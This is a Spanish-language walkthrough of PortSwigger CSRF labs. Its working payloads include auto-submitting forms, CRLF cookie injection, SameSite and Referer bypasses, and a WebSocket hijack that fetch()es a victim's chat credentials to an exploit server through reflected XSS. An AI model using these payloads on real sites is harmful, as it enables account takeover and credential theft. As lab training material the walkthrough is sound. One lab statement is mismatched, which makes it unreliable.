# Cross-site request forgery (CSRF)

## Lab: CSRF vulnerability with no defenses

### Enunciado

Este laboratorio tiene una función para cambiar el correo electrónico que es vulnerable a ataques CSRF.

Para resolverlo, crea un código HTML que haga un ataque CSRF para cambiar la dirección de correo del usuario que vea la página. Después, súbelo a tu servidor de explotación.

Puedes iniciar sesión en tu propia cuenta con estas credenciales:

* Usuario: **wiener**
* Contraseña: **peter**

### Resolución

Nos logueamos. Interceptamos la petición de cambiar el email para mandarla al **Repeater**.

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Es el único parámetro que se envía. Vamos al **exploit server** y ahí creamos la plantilla HTML maliciosa.

```
<html>
    <body>
        <form action='https://0a4100b10448eae680482b6e00b50061.web-security-academy.net/my-account/change-email' method='POST'>
            <input name="email" value="hola@beafn28.com" type="hidden"/>  
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

Lo mandamos a la víctima y completamos el laboratorio.

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Lab: CSRF where token validation depends on request method

### Enunciado

Este laboratorio bloquea todas las etiquetas HTML excepto las personalizadas (custom tags). Realizar un ataque de cross-site scripting (XSS) que inyecte una etiqueta personalizada y que muestre automáticamente un `alert(document.cookie)`.

### Resolución

Nos logueamos. Vemos el código fuente.

```
<form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
<label>Email</label>
<input required="" type="email" name="email" value="">
<input required="" type="hidden" name="csrf" value="p5IRmsvYi1dvF5KChXztQ996AP0jHmHk">
<button class="button" type="submit"> Update email </button>
 </form>
```

Como podemos ver tenemos el valor CSRF escondido. Vamos al exploit server para poner el ataque CSRF.

```
<html>
	<body>
		<form action="https://0a5900700399a8b783b41a3e00420018.web-security-academy.net/my-account/change-email" method="POST">
		    <input type="hidden" name="email" value="hola@beafn28.com">
		</form>
		<script>
			document.forms[0].submit();
		</script>
	</body>
</html>
```

Vemos que no es como el anterior laboratorio así que cambiamos de POST a GET.

```
<html>
	<body>
		<form action="https://0a5900700399a8b783b41a3e00420018.web-security-academy.net/my-account/change-email" method="GET">
		    <input type="hidden" name="email" value="hola@beafn28.com">
		</form>
		<script>
			document.forms[0].submit();
		</script>
	</body>
</html>
```

<figure><img src="../../.gitbook/assets/image (1482).png" alt=""><figcaption></figcaption></figure>

## Lab: CSRF where token validation depends on token being present

### Enunciado

La funcionalidad de cambio de correo electrónico de este laboratorio es vulnerable a CSRF. Usar tu servidor de exploits para alojar una página HTML que realice un ataque CSRF y cambie la dirección de correo electrónico del usuario que la visite.

Puedes iniciar sesión en tu propia cuenta con las siguientes credenciales:\
**Usuario**: `wiener`\
**Contraseña**: `peter`

### Resolución

Nos logueamos. Interceptamos la petición si cambiamos el email.

<figure><img src="../../.gitbook/assets/image (1483).png" alt=""><figcaption></figcaption></figure>

Sí que nos cambia el correo. Por POST si quitamos el CSRF sí cambia entonces no lo valida.

```
<form class="login-form" name="change-email-form" action="https://0aaa00b8047e91f48219ba7e00b100e4.web-security-academy.net/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="test@test.com">
</form>

<script>
    document.forms[0].submit();
</script>
```

Mandamos eso a la víctima.

<figure><img src="../../.gitbook/assets/image (1484).png" alt=""><figcaption></figcaption></figure>

## Lab: CSRF where token is not tied to user session

### Enunciado

La funcionalidad de cambio de correo electrónico de este laboratorio es vulnerable a CSRF. Utiliza tokens para intentar prevenir ataques CSRF, pero no están integrados en el sistema de manejo de sesión del sitio. Usa tu servidor de exploits para alojar una página HTML que realice un ataque CSRF y cambie la dirección de correo electrónico del usuario que la visite. Tienes dos cuentas en la aplicación que puedes usar para ayudarte a diseñar tu ataque. Las credenciales son las siguientes:

* wiener:peter
* carlos:montoya

### Resolución

Nos logueamos con los dos. EL CSRF es un campo requerido no lo podemos quitar y si cambiamos el método tampoco nos vale. Interceptamos pero le damos a Drop pero sí que nos copiamos ese token ya que no ha sido usado. Vamos a cambiar el correo de Wiener.

<figure><img src="../../.gitbook/assets/image (1485).png" alt=""><figcaption></figcaption></figure>

Si cambiamos email y enviamos no nos deja ya que ya ha sido usado.

<figure><img src="../../.gitbook/assets/image (1486).png" alt=""><figcaption></figcaption></figure>

Usamos el token que copiamos anteriormente y lo enviamos.

<figure><img src="../../.gitbook/assets/image (1487).png" alt=""><figcaption></figcaption></figure>

Se cambia. Volvemos a hacer lo mimo pero vamos a crear una plantilla en el exploit server con un token que no ha sido usado.

```
<form class="login-form" name="change-email-form" action="https://0aeb002e0308a516809a9965003a0095.web-security-academy.net/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="hola@beafn28.com">
    <input required="" type="hidden" name="csrf" value="VLP7coZnGhH6HBDu5GwvShgSWmqPZbhU">
</form>

<script>
    document.forms[0].submit();
</script>
```



<figure><img src="../../.gitbook/assets/image (1488).png" alt=""><figcaption></figcaption></figure>

## Lab: CSRF where token is tied to non-session cookie

### Enunciado

La funcionalidad de cambio de correo electrónico de este laboratorio es vulnerable a CSRF. Utiliza tokens para intentar prevenir ataques CSRF, pero no están completamente integrados en el sistema de manejo de sesión del sitio. Usar tu servidor de exploits para alojar una página HTML que realice un ataque CSRF y cambie la dirección de correo electrónico del usuario que la visite. Tienes dos cuentas en la aplicación que puedes usar para ayudarte a diseñar tu ataque. Las credenciales son las siguientes:

* wiener:peter
* carlos:montoya

### Resolución

Nos logueamos. Miramos el código fuente.&#x20;

<figure><img src="../../.gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>

Interceptando la petición y lo mandamos a Repeater. Cuando accedo, **me redirige a /login**, lo que cierra la sesión actual **y además establece una nueva cookie de sesión**. Luego, vamos a **iniciar sesión como el usuario carlos**, y **probar a reemplazar la cookie csrfKey y el parámetro csrf con los valores del usuario wiener**.

Nos damos cuenta que solo cambia la cookie de session pero no podemos hacer mucho más así que nos fijamos en el campò de búsqueda.

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Vemos un nuevo valor en la cookie por lo que podemos setear un valor que queremos en la cookie.

{% embed url="https://medium.com/@protostar0/crlf-injection-allow-cookie-injection-in-root-domain-xss-812cd807ba5b" %}

{% embed url="https://www.geeksforgeeks.org/crlf-injection-attack/" %}

Habiendo leído esas páginas realizamos este paylaod.

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Ya hemos seteado una nueva cookie.

```
<form class="login-form" name="change-email-form" action="https://0a84007904ed8a5482329ceb005f00d4.web-security-academy.net/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="pepe@test.com">
    <input required="" type="hidden" name="csrf" value="y2RwTkKTYiI0d6AWTp2BuMVGZw8FPtnx">
</form>

<img src="https://0a84007904ed8a5482329ceb005f00d4.web-security-academy.net/search=prueba%0d%0aSet-Cookie:%20csrfKey=0s3QkhzdjMVzJXdwPWUSXhEq5tgPrvlH%3b%20SameSite=None" onerror="document.forms[0].submit();">
```

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Lab: CSRF where token is duplicated in cookie

### Enunciado

La funcionalidad de cambio de correo electrónico de este laboratorio es vulnerable a CSRF. Intenta usar la técnica insegura de prevención de CSRF conocida como "double submit".

Usa tu servidor de exploits para alojar una página HTML que realice un ataque CSRF y cambie la dirección de correo electrónico del usuario que la visite. Puedes iniciar sesión en tu propia cuenta con las siguientes credenciales:

* **Usuario:** `wiener`
* **Contraseña:** `peter`

### Resolución

Nos logueamos para cambiar el email y ver esa petición.

<figure><img src="../../.gitbook/assets/image (10) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Como puedes ver, **el valor de nuestra cookie CSRF coincide con el valor del parámetro CSRF en el POST**. Esto es lo que se conoce como la defensa **“double submit”** contra ataques CSRF.

Vemos el campo de búsqueda para setear una nueva cookie.

<figure><img src="../../.gitbook/assets/image (11) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Vemos que al enviar la petición se encuentra una nueva cookie. En el anterior laboratorio vimos que eso permite al atacante añadir una nueva cookie.

```
/?search=anything%0d%0aSet-Cookie:csrfKey=CRLF%3b%20SameSite=None
```

<figure><img src="../../.gitbook/assets/image (12) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Vamos a enviar a la víctima el siguiente script.

```
<html>
	<head>
		<title>CSRF</title>
	</head>
	<body>
		<form action="https://0a8f00d90409f36c81fb52ed002a00bb.web-security-academy.net/my-account/change-email" method="POST">
		    <input type="hidden" name="email" value="prueba@prueba.com">
		    <input type="hidden" name="csrf" value="oP3BBuAIGSPnmoUfq3pVzpCgl09cDN4r">
		</form>
		<img src="https://0a8f00d90409f36c81fb52ed002a00bb.web-security-academy.net/?search=anything%0d%0aSet-Cookie:csrf=oP3BBuAIGSPnmoUfq3pVzpCgl09cDN4r%3b%20SameSite=None" onerror="document.forms[0].submit()">
	</body>
</html>
```

<figure><img src="../../.gitbook/assets/image (13) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Lab: SameSite Strict bypass via client-side redirect

### Enunciado

**La función de cambio de correo electrónico de este laboratorio es vulnerable a CSRF.** Para resolver el laboratorio, **realiza un ataque CSRF que cambie la dirección de correo electrónico de la víctima.** Debes usar el **servidor de exploits proporcionado** para alojar tu ataque.

**Puedes iniciar sesión en tu propia cuenta con las siguientes credenciales:**

* **Usuario:** `wiener`
* **Contraseña:** `peter`

### Resolución

Nos logueamos.

<figure><img src="../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

Vemos que tenemos el atributo SameSite puesto a strict. Al cambiar el email tampoco vemos un CSRF token.

**Restricción Strict:**

Si una cookie se configura con el atributo **SameSite=Strict**, los navegadores **no la incluirán en ninguna solicitud cross-site**.

Puedes **lograr superar esta limitación** si encuentras un **"gadget"** que provoque **una segunda solicitud dentro del mismo sitio**.

Un ejemplo de **gadget** es una **redirección del lado del cliente** que construye dinámicamente el destino de la redirección usando **parámetros de la URL controlados por el atacante**.

Para los navegadores, **estas redirecciones del lado del cliente no son realmente redirecciones**; la solicitud resultante se trata como **una solicitud independiente y ordinaria**.

Lo más importante es que **se considera una solicitud same-site** y, por lo tanto, **incluirá todas las cookies relacionadas con el sitio**, sin importar las restricciones configuradas.

Si puedes manipular este **gadget** para generar **una solicitud secundaria maliciosa**, podrías **bypassear por completo** cualquier restricción de cookie SameSite.

Escribimos un post. Nos damos cuenta que hay un script JS.

<figure><img src="../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

Cuando vamos a **/post/comment/confirmation**, se ejecuta este **JavaScript**:

Después de 3 segundos, redirige al usuario a **/post/\<postId>**.

**Pero el parámetro GET `postId` está completamente bajo el control del atacante.**

<figure><img src="../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

Como **/my-account/change-mail** acepta GET realizamos el siguiente script para enviar a la máquina.

```
<html>
    <head>
        <title>CSRF-8</title>
    </head>
    <body>
        <script type="text/javascript">
            // Before URL encoded:
            // ?postId=../my-account/change-email?email=test@test.com&submit=1
            document.location = 'https://0a7100b1033c27c8803d03e30043007a.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email%3Femail%3Dtest%40test.com%26submit%3D1';
        </script>
    </body>
</html>
```

<figure><img src="../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>

## Lab: SameSite Lax bypass via method override

### Enunciado

**La función de cambio de correo electrónico de este laboratorio es vulnerable a CSRF.** Para resolver el laboratorio, **realiza un ataque CSRF que cambie la dirección de correo electrónico de la víctima.** Debes usar el **servidor de exploits proporcionado** para alojar tu ataque.

**Puedes iniciar sesión en tu propia cuenta con las siguientes credenciales:**

* **Usuario:** `wiener`
* **Contraseña:** `peter`

> Las restricciones predeterminadas de SameSite difieren entre navegadores. Como la víctima usa **Chrome**, se recomienda **también usar Chrome (o el navegador Chromium incorporado en Burp)** para probar tu exploit.

### Resolución

Nos logueamos.

<figure><img src="../../.gitbook/assets/image (14) (1) (1).png" alt=""><figcaption></figcaption></figure>

Vemos que no tenemos el atributo SameSite. En Chrome, **aunque el desarrollador no haya configurado nada, se aplican restricciones SameSite=Lax de forma predeterminada**. Esto significa que la cookie **solo se enviará en solicitudes cross-site que cumplan ciertos criterios específicos**.

Por último, vamos a **examinar el código fuente de la página /my-account**.

Vemos que al cambiar el email no incluye un CSRF token.

<figure><img src="../../.gitbook/assets/image (15) (1) (1).png" alt=""><figcaption></figcaption></figure>

Cuando hacemos clic en el botón **“Update email”**, se envía una **solicitud POST** a **/my-account/change-email**, con el parámetro **email**.

Para poder realizar un **ataque CSRF**, necesitamos **analizar más a fondo** cómo funciona la restricción **SameSite=Lax**.

**Restricción SameSite=Lax:**

Los navegadores **enviarán la cookie en solicitudes cross-site**, pero solo si **ambas condiciones se cumplen**:

* La solicitud usa el **método GET**.
* La solicitud proviene de una **navegación de nivel superior** del usuario, como hacer clic en un enlace.

**¿Qué significa esto?**

* Que la cookie **no se incluirá** en solicitudes **POST** de tipo cross-site, por ejemplo.
* Las solicitudes POST suelen usarse para **modificar datos o estado** en el servidor (según las buenas prácticas), por lo que son **un objetivo habitual para ataques CSRF**.
* Además, la cookie **tampoco se enviará** en solicitudes en segundo plano, como las iniciadas por **scripts**, **iframes** o **cargas de imágenes u otros recursos**.

```
<html>
    <head>
        <title>CSRF</title>
    </head>
    <body>
        <script type="text/javascript">
            document.location = 'https://0a0a00670358661886a4263d006500b9.web-security-academy.net/my-account/change-email?email=prueba@prueba.com';
        </script>
    </body>
</html>
```

No se permite este método. Ahora bien, **incluso si una solicitud GET ordinaria no está permitida**, algunos frameworks **ofrecen mecanismos para sobrescribir el método especificado en la línea de la solicitud**.

Por ejemplo, **Symfony** admite el parámetro **\_method** en formularios, **que tiene prioridad sobre el método normal para fines de enrutamiento**.

```
<html>
    <head>
        <title>CSRF</title>
    </head>
    <body>
        <form action="https://0a0a00670358661886a4263d006500b9.web-security-academy.net/my-account/change-email" method="GET">
            <input type="hidden" name="_method" value="POST">
            <input type="hidden" name="email" value="test@test.com">
        </form>
        <script>
            document.getElementsByTagName('form')[0].submit();
        </script>
    </body>
</html>
```

<figure><img src="../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

## Lab: SameSite Strict bypass via sibling domain

### Enunciado

**La función de chat en vivo de este laboratorio es vulnerable a secuestro de WebSocket en el lado del cliente (CSWSH, por sus siglas en inglés).**

Para resolver el laboratorio, **inicia sesión en la cuenta de la víctima.**

Para hacerlo, **usa el servidor de exploits proporcionado** para realizar un ataque CSWSH que **exfiltre el historial de chat de la víctima** al servidor predeterminado de **Burp Collaborator**.

El historial de chat **contiene las credenciales de inicio de sesión en texto claro**.

> Si aún no lo has hecho, te recomendamos completar nuestro tema sobre **vulnerabilidades en WebSocket** antes de intentar este laboratorio.

### Resolución

Vemos el script JS.

<figure><img src="../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

El chat utiliza **WebSocket** de la siguiente forma:

```javascript
var webSocket = new WebSocket(chatForm.getAttribute("action"));
```

También podemos ver que la función **sendMessage()** llama a **htmlEncode()** para codificar en HTML nuestro input:

```javascript
function htmlEncode(str) {
    if (chatForm.getAttribute("encode")) {
        return String(str).replace(/['"<>&\r\n\\]/gi, function (c) {
            var lookup = {'\\': '&#x5c;', '\r': '&#x0d;', '\n': '&#x0a;', '"': '&quot;', '<': '&lt;', '>': '&gt;', "'": '&#39;', '&': '&amp;'};
            return lookup[c];
        });
    }
    return str;
}
```

Como puedes ver, **codifica en HTML muchos caracteres especiales**, por lo que **un XSS basado en el DOM tradicional no sería explotable aquí.**

Si la **solicitud de handshake del WebSocket** es vulnerable a **CSRF**, entonces la página web de un atacante **puede realizar una solicitud cross-site para abrir un WebSocket en el sitio vulnerable**.

Para lograr esto, **voy a crear un formulario HTML** que **envíe automáticamente una solicitud WebSocket a /chat** con el mensaje **READY**, y que **exfiltre el historial de chat de la víctima**.

```
<html>
    <head>
        <title>CSRF</title>
    </head>
    <body>
        <script>
            // Create a new WebSocket object that points to /chat endpoint
            var webSocket = new WebSocket('wss://0a1f00e1046478b380b4e48300e500f6.web-security-academy.net/chat');
            webSocket.onopen = function() {
                // Send "READY" message to /chat to render the chat history
                webSocket.send("READY");
            };
            webSocket.onmessage = function(event) {
                // Send a GET request with the chat history to exploit server 
                fetch('https://exploit-0a6f001d042378708046e31b01b00092.exploit-server.net/log?'+event.data, {method: 'GET'});
            };
        </script>
    </body>
</html>

```

<figure><img src="../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

```
cms-0a1f00e1046478b380b4e48300e500f6.web-security-academy.net
```

<figure><img src="../../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>

Viendo la petición nos damos cuenta que tenemos el atributo SameSite y puesto a strict.

<figure><img src="../../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

Vemos que se refleja el input usuario.

```
<script>alert(document.domain)</script>
```

<figure><img src="../../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>

Ahora hemos identificado **dos vulnerabilidades**:

* **CSWSH** en el **"Live chat".**
* **XSS reflejado** en la página de inicio de sesión del dominio hermano **cms**.

Como el dominio hermano **cms** forma parte del **mismo sitio**, podemos **usar el XSS reflejado** para lanzar el ataque **CSWSH**, sin que las restricciones **SameSite** del navegador lo bloqueen.

URLcodeamos el siguiente script.

```
<script>
let newWebSocket = new WebSocket("wss://0a1f00e1046478b380b4e48300e500f6.web-security-academy.net/chat");

newWebSocket.onopen = function (evt) {
  newWebSocket.send("READY");
};

newWebSocket.onmessage = function (evt) {
  var message = evt.data;
  fetch(
    "https://exploit-0a6f001d042378708046e31b01b00092.exploit-server.net/exploit?msg=" + btoa(message)
  );
};
</script>
```

<figure><img src="../../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>

```
<script>
  document.location = "https://cms-0aef0030037a119f80e635b7007400fc.web-security-academy.net/login?username=%3c%73%63%72%69%70%74%3e%0a%6c%65%74%20%6e%65%77%57%65%62%53%6f%63%6b%65%74%20%3d%20%6e%65%77%20%57%65%62%53%6f%63%6b%65%74%28%22%77%73%73%3a%2f%2f%30%61%31%66%30%30%65%31%30%34%36%34%37%38%62%33%38%30%62%34%65%34%38%33%30%30%65%35%30%30%66%36%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%63%68%61%74%22%29%3b%0a%0a%6e%65%77%57%65%62%53%6f%63%6b%65%74%2e%6f%6e%6f%70%65%6e%20%3d%20%66%75%6e%63%74%69%6f%6e%20%28%65%76%74%29%20%7b%0a%20%20%6e%65%77%57%65%62%53%6f%63%6b%65%74%2e%73%65%6e%64%28%22%52%45%41%44%59%22%29%3b%0a%7d%3b%0a%0a%6e%65%77%57%65%62%53%6f%63%6b%65%74%2e%6f%6e%6d%65%73%73%61%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%20%28%65%76%74%29%20%7b%0a%20%20%76%61%72%20%6d%65%73%73%61%67%65%20%3d%20%65%76%74%2e%64%61%74%61%3b%0a%20%20%66%65%74%63%68%28%0a%20%20%20%20%22%68%74%74%70%73%3a%2f%2f%65%78%70%6c%6f%69%74%2d%30%61%36%66%30%30%31%64%30%34%32%33%37%38%37%30%38%30%34%36%65%33%31%62%30%31%62%30%30%30%39%32%2e%65%78%70%6c%6f%69%74%2d%73%65%72%76%65%72%2e%6e%65%74%2f%65%78%70%6c%6f%69%74%3f%6d%73%67%3d%22%20%2b%20%62%74%6f%61%28%6d%65%73%73%61%67%65%29%0a%20%20%29%3b%0a%7d%3b%0a%3c%2f%73%63%72%69%70%74%3e&password=my_password";
</script>
```

Enviamos a la víctima.

```
<html>
    <head>
        <title>CSRF</title>
    </head>
    <body>
        <script>
            document.location = 'https://cms-0a1f00e1046478b380b4e48300e500f6.web-security-academy.net/login?username=https://cms-0aef0030037a119f80e635b7007400fc.web-security-academy.net/login?username=%3c%73%63%72%69%70%74%3e%0a%6c%65%74%20%6e%65%77%57%65%62%53%6f%63%6b%65%74%20%3d%20%6e%65%77%20%57%65%62%53%6f%63%6b%65%74%28%22%77%73%73%3a%2f%2f%30%61%31%66%30%30%65%31%30%34%36%34%37%38%62%33%38%30%62%34%65%34%38%33%30%30%65%35%30%30%66%36%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%63%68%61%74%22%29%3b%0a%0a%6e%65%77%57%65%62%53%6f%63%6b%65%74%2e%6f%6e%6f%70%65%6e%20%3d%20%66%75%6e%63%74%69%6f%6e%20%28%65%76%74%29%20%7b%0a%20%20%6e%65%77%57%65%62%53%6f%63%6b%65%74%2e%73%65%6e%64%28%22%52%45%41%44%59%22%29%3b%0a%7d%3b%0a%0a%6e%65%77%57%65%62%53%6f%63%6b%65%74%2e%6f%6e%6d%65%73%73%61%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%20%28%65%76%74%29%20%7b%0a%20%20%76%61%72%20%6d%65%73%73%61%67%65%20%3d%20%65%76%74%2e%64%61%74%61%3b%0a%20%20%66%65%74%63%68%28%0a%20%20%20%20%22%68%74%74%70%73%3a%2f%2f%65%78%70%6c%6f%69%74%2d%30%61%36%66%30%30%31%64%30%34%32%33%37%38%37%30%38%30%34%36%65%33%31%62%30%31%62%30%30%30%39%32%2e%65%78%70%6c%6f%69%74%2d%73%65%72%76%65%72%2e%6e%65%74%2f%65%78%70%6c%6f%69%74%3f%6d%73%67%3d%22%20%2b%20%62%74%6f%61%28%6d%65%73%73%61%67%65%29%0a%20%20%29%3b%0a%7d%3b%0a%3c%2f%73%63%72%69%70%74%3e&password=my_password';
        </script>
    </body>
</html>

```

<figure><img src="../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>

Tenemos las credenciales de carlos por lo que nos logueamos.

<figure><img src="../../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>

## Lab: SameSite Lax bypass via cookie refresh

### Enunciado

**La función de cambio de correo electrónico de este laboratorio es vulnerable a CSRF.** Para resolver el laboratorio, **realiza un ataque CSRF que cambie la dirección de correo electrónico de la víctima.** Debes usar el **servidor de exploits proporcionado** para alojar tu ataque.

**El laboratorio admite inicio de sesión basado en OAuth.**\
Puedes iniciar sesión a través de tu cuenta de redes sociales con las siguientes credenciales:

* **Usuario:** `wiener`
* **Contraseña:** `peter`

> Las restricciones predeterminadas de SameSite difieren entre navegadores. Como la víctima usa **Chrome**, se recomienda **también usar Chrome (o el navegador Chromium incorporado en Burp)** para probar tu exploit.

### Resolución

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Como se puede observar, **no incluye el atributo SameSite**, así que **Chrome aplica automáticamente la restricción Lax por defecto**.

Normalmente, **las cookies con Lax no se envían en solicitudes POST de sitios cruzados**. Sin embargo, para mantener la compatibilidad con **Single Sign-On (SSO)**, **Chrome permite estas solicitudes POST durante los primeros 120 segundos tras iniciar sesión**.

Esto significa que hay **un margen de dos minutos** en el que el usuario **puede quedar expuesto a ataques cross-site**.

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Como puedes ver, **el formulario no tiene un parámetro de token CSRF**, que normalmente ayudaría a prevenir ataques CSRF.

Además, cuando enviamos el formulario, **realiza una solicitud POST a /my-account/change-email**, incluyendo el parámetro **email**.

Con esta información, **podemos crear un payload CSRF** para actualizar la dirección de correo electrónico de la víctima.

Pero antes hay algo importante que debemos tener en cuenta:

**Podemos forzar la actualización de la cookie abriendo una nueva pestaña**, de forma que el navegador **no abandone la página antes de que puedas lanzar el ataque final**.

El pequeño inconveniente de este método es que **los navegadores bloquean las ventanas emergentes a menos que se abran mediante una interacción manual del usuario**.

```
<form action="https://0aa700d10377ccd180fe1774004d00b6.web-security-academy.net/my-account/change-email" method="POST">
  <input type="hidden" name="email" value="wiener4@normal-user.net"/>
  <input type="submit" value="submit"/>
</form>
<p>Click anywhere on the page</p>
<script>
  window.onclick = () => {
    window.open("https://0aa700d10377ccd180fe1774004d00b6.web-security-academy.net/social-login", "_blank");
    setTimeout(change_email, 3000);
  }

  function change_email() {
    document.forms[0].submit();  
  }
</script>
```

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Lab: CSRF where Referer validation depends on header being present

### Enunciado

**La funcionalidad de cambio de correo electrónico de este laboratorio es vulnerable a CSRF.** Intenta bloquear las solicitudes entre dominios, pero **tiene un mecanismo de respaldo inseguro**.

**Usa tu servidor de exploits para alojar una página HTML que realice un ataque CSRF y cambie la dirección de correo electrónico del usuario que la visite.**

**Puedes iniciar sesión en tu propia cuenta con las siguientes credenciales:**

* **Usuario:** `wiener`
* **Contraseña:** `peter`

### Resolución

Nos logueamos para ver la petición al cambiar el email.

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

No hay un CSRF token por lo que realizamos el siguiente ataque.

```
<html>
    <head>
        <title>CSRF</title>
    </head>
    <body>
        <form action="https://0ab300ff0315bc5f80b5e925003400ab.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="test@test.com">
        </form>

        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Como el encabezado Referer se puede manipular por completo**, en realidad **podemos saltarnos esta verificación**.

Según la documentación de Mozilla, **podemos usar la etiqueta `<meta>` para controlar o anular el header Referer**.

```
<html>
    <head>
	    <meta name="referrer" content="no-referrer">
        <title>CSRF</title>
    </head>
    <body>
        <form action="https://0ab300ff0315bc5f80b5e925003400ab.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="test@test.com">
        </form>

        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Lab: CSRF with broken Referer validation

### Enunciado

**La funcionalidad de cambio de correo electrónico de este laboratorio es vulnerable a CSRF.** Intenta **detectar y bloquear solicitudes entre dominios**, pero **su mecanismo de detección puede ser evadido**.

**Usa tu servidor de exploits para alojar una página HTML que realice un ataque CSRF y cambie la dirección de correo electrónico del usuario que la visite.**

**Puedes iniciar sesión en tu propia cuenta con las siguientes credenciales:**

* **Usuario:** `wiener`
* **Contraseña:** `peter`

### Resolución

Nos logueamos y vemos la petición de cambiar email.

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Vemos que no tenemos CSRF token por lo que realizamos lo siguiente.

```
<html>
    <head>
        <title>CSRF</title>
    </head>
    <body>
        <form action="https://0ac9005e04c5dc3181cded9100f3002c.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="test@test.com">
        </form>

        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Nos sale como el anterior laboratorio pero aún así con la etiqueta meta no lo solucionamos. Vemos la cabecera de Referer.

<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Nos salta error si enviamos distinta URL por lo que voy a intentar añadir un parámetro GET después de lo que se espera.

<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Según la documentación de Mozilla, **podemos usar la función de JavaScript `history.pushState()` para manipular la URL mostrada sin recargar la página**.

Hay que tener en cuenta que en muchos navegadores **eliminan la cadena de consulta del Referer por defecto como medida de seguridad**.

Para **evitar esa limitación**, **podemos agregar una nueva etiqueta `<meta>`** para **anular ese comportamiento** y asegurarnos de que **la URL completa se incluya en la solicitud**.

```
<html>
    <head>
        <meta name="referrer" content="unsafe-url">
        <title>CSRF</title>
    </head>
    <body>
        <form action="https://0ac9005e04c5dc3181cded9100f3002c.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="prueba@prueba.com">
        </form>

        <script>
            history.pushState('', '', '/?0ac9005e04c5dc3181cded9100f3002c.web-security-academy.net')
            document.forms[0].submit();
        </script>
    </body>
</html>

```

<figure><img src="../../.gitbook/assets/image (1489).png" alt=""><figcaption></figcaption></figure>
